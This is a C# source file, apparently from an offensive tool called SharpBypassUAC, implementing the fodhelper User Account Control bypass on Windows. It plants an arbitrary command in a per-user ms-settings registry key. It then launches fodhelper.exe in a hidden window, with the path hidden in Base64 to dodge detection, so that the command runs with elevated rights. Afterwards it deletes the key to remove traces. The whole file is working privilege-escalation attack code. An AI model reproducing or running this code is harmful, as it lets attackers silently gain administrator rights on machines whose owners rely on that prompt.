﻿using System;
using System.Threading;
using System.Diagnostics;
using System.Text;
using Microsoft.Win32;

namespace SharpBypassUAC
{
    public class FodHelper
    {
        public FodHelper (byte[] encodedCommand)
        {
            //Credit: https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1

            //Check if UAC is set to 'Always Notify'
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key for fodhelper
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            fod.SetValue("", @command);
            fod.Close();

            try
            {
                //start fodhelper
                Process p = new Process();
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                byte[] exe = Convert.FromBase64String("QzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxmb2RoZWxwZXIuZXhl");
                p.StartInfo.FileName = Encoding.UTF8.GetString(exe); 
                p.Start();
            }
            catch (Exception e)
            {
                Console.WriteLine("Unable to start  [x] {0}", e.Message);
            }
;
            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("ms-settings");
            return;
        }
    }
}
